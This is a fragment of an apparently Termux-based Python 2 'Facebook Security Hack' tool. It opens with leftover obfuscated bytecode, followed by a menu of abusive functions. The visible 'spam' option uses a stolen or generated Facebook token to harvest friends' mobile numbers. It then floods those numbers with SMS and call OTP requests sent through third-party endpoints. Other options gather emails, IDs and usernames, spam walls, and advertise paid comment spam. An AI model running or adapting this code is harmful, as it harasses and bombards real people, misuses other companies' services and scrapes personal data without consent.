00\x00\x00(\x00\x00\x00\x00s\x03\x00\x00\x00<s>t\x08\x00\x00\x00<module>\x01\x00\x00\x00sJ\x00\x00\x00\x15\x01\x18\x01\x18\x01\x15\x01\x06\x01S\x01\x1a\x01\x0f\x01\r\x01\x1a\x01\x03\x01\x15\x01\x0f\x01\x12\x01\x03\x01\x11\x01\n\x01\x06\x01\x06\x01\x1e\x01\x16\x01\x1b\x01\x1d\x01\x1a\x01\r\x01\x0b\x01\x03\x01\r\x01\r\x01\x16\x01\r\x01\x0f\x02\x03\x01\r\x01\r\x01\x12\x01\r\x01'''))
				
	elif pilih == "b" or pilih == "B":
		try:
			token=open('my_token.txt').readline().replace('\n','')
		except:
			print W+R+"[-]"+W+" Please Generate The Acces Token."
			raw_input(W+R+'[!]'+W+' Press enter to menu ...')
			os.system('clear')
			main()
		print W+B+"[+] "+W+"Grabbing ID ..."
		try:
			data= requests.get('https://graph.facebook.com/me/friends?access_token='+token+'')
		except:
			print W+R+"[-] Check ur connection!"+W
			raw_input('[!]'+W+' Press enter to menu ...')
			os.system('clear')
			main()
		loaded = json.loads(data.text)
		saved = open('id.txt','w')
		try:
			for id in loaded['data']:
				saved.write(id['id'] + '\n')
			saved.close()
		except:
			print W+R+"[-]"+W+" Please Generate The Acces Token."
			os.system('rm -rf id.txt')
			raw_input(R+'[!]'+W+' Press enter to menu ...')
			os.system('clear')
			main()
			print W+B+"[*]"+W+" Succes ..."
		file=open('id.txt').readlines()
		k=len(file)
		print W+B+"[*] "+W+R+str(k)+W+" ID Loaded!"
		print W+B+"[*]"+W+" Spamming Phone Number ..."
		fl=open('id.txt')
		for p in range(k):
			o=fl.readline().replace('\n','')
			try:
				r=requests.get('https://graph.facebook.com/'+o+'?access_token='+token+'')
			except:
				print W+R+"[-] Check ur connection!"+W
				os.system('rm -rf id.txt')
				raw_input(R+'[!]'+W+' Press enter to menu ...')
				os.system('clear')
				main()
			js=json.loads(r.text)
			try:
				k=js["mobile_phone"]
				joy=k.replace('+62','0')
				param={'phone':joy,'smsType':'1'}
				try:
					requestss=requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
				except:
					print W+R+"[-] Check ur connection!"+W
					os.system('rm -rf id.txt')
					raw_input(R+'[!]'+W+' Press enter to menu ...')
					os.system('clear')
					main()
				if "succes" in requestss.text:
					print R+"="*40
					print W+B+"[*]"+W+" ID\t\t: "+js['id']
					print W+B+"[*]"+W+" Name\t: "+js['name']+"." 
					print W+B+"[*]"+W+" Number\t:",k
					print W+B+"[*]"+W+" Spammed\t: sms"
					print W+B+"[*]"+W+" Status\t: "+G+"Succes."+W
				else:
					print W+B+"[*]"+W+" Name\t: "+js['name']+"." 
					print W+B+"[*]"+W+" Number\t:"
  				print W+B+"[*]"+W+" Spammed\t: sms"
				param2={'msisdn':k,'accept':'call'}
				try:
					requests2=requests.post('https://www.tokocash.com/oauth/otp',data=param2)
				except:
					print R+"[-] Check ur connection!"+W
					os.system('rm -rf id.txt')
					raw_input(R+'[!]'+W+' Press enter to menu ...')
					main()
				if 'otp_attempt_left' in requests2.text:
					print W+B+"[*]"+W+" Spammed\t: Telephone"
					print W+B+"[*]"+W+" Status\t: "+G+"Succes."+W
				else:
					print W+B+"[*]"+W+" Spammed\t: Telephone"
					print W+B+"[*]"+W+" Status\t: "+R+"Failed."+W+""
						
			except:
				pass
			os.system('rm -rf id.txt')
			
	elif pilih == "c" or pilih == "C":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			spam_from_id()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
			
	elif pilih == "d" or pilih == "D":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			spam_only()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
	
	elif pilih == "e" or pilih == "E":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			get_number()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			try:
				output.close()
				put.close()
			except:
				raw_input( W+"[!]"+R+" Press enter to menu ...")
				os.system('clear')
				main()
				
	elif pilih == "f" or pilih == "F":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			getnum()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
	
	elif pilih == "g" or pilih == "G":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			getusername()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
	
	elif pilih == "h" or pilih == "H":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			getid()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
			
	elif pilih == "i" or pilih == "I":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			getemail()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
			
	elif pilih == "j" or pilih == "J":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			emailfromid()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
			
	elif pilih == "k" or pilih == "K":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			name()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
		
			
			
			
			
			
	elif pilih == "l" or pilih == "L":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			spam_wall_target()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
		
	elif pilih == "m" or pilih == "M":
		print """
	What's Powerful?
	Spam Comments Your Friends
	Only With 1/10 Accounts
		
	Buy 50k This Tool Contact Me FACEBOOK anonyminHack.5
		"""
		raw_input( W+"[!]"+R+" Press enter to menu ...")
		os.system('clear')
		main()
		
		
	elif pilih == "n" or pilih == "N":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			reaction()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
	
	elif pilih == "o" or pilih == "O":
		try:
			open('my_token.txt')
		except:
			print R+"[-]"+W+" Please Generate Your Acces Token!"
			raw_input( R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		try:
			nems()
			raw_input( W+R+"[!]"+W+" Press enter to menu ...")
			os.system('clear')
			main()
		except:
			raw_input( W+"\n[!]"+R+" Press enter to menu ...")
			os.system('clear')
			main()
	  
	elif pilih == "p" or pilih == "P":
		print """
	Tittle\t  : Facebook Security Hack
	Coder\t  : AnonyminHack5 (admin)
	Github\t  : https://github.com/TermuxHackz
	WebSite  : https://rafitricker.blogsky.com
		
	(C) Copyright  2020 By AnonyminHack5
	 	 """
	 	raw_input( W+R+"[!]"+W+" Press enter to menu ...")
	 	os.system('clear')
	 	main()
	 	
	elif pilih == "q" or pilih == "Q":
		sys.exit(W+B+"[++ Exiting ... \(^_^) Byee"+W)
		
	else:
		print R+"[-] Input Failed."
		raw_input(W+R'[!]'+W+' Press enter to menu ...')
		os.system('clear')
		main()
				
if __name__ == "__main__":
	try:
		main()
	except:
		sys.exit(W+B+"[++ Exiting ... \(^_^) Byee"+W)